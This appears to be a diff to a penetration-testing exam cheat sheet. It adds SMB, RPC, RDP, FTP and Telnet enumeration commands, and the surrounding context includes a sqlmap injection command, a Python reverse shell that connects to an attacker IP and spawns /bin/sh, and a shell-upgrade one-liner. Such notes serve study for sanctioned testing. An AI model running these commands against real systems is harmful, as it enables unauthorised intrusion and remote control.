@@ -73,12 +73,36 @@ For this exam I'm writing
 
 `sqlmap -u “https://target_site.com/page/”--proxy="http://127.0.0.1:8080/" --cookie=”SESSID=lred0jr6na1vmci;” --data=”p1=value1” -p p1 --level=5 --risk=3 --dbms=mysql --technique=BEUSTQ --force-ssl`
 
+## Telnet enumeration
+
+`telnet 192.168.0.1`
+
+## FTP enumeration
+
+`ftp 192.168.0.1`
+
+## SMB Enumeration
+
+`smbmap -H 192.168.0.1 -R`
+`smbclient -L 192.168.0.1`
+`smbclient \\\\192.168.0.1\\share`
+
+## RPC Enumeration
+
+`rpcclient -U "" -N 192.168.0.1`
+`enumdomusers`
+`queryuser <username>`
+
+## RDP Enumeration
+
+`xfreerdp /v:10.129.189.90 /cert:ignore /u:Administrator` 
+
 ## Shells
 
 "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.23\",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
 
 https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 
-### after obtaininh shell
+### after obtaining shell
 
 python -c 'ímport pty;pty.spawn("/bin/sh")'
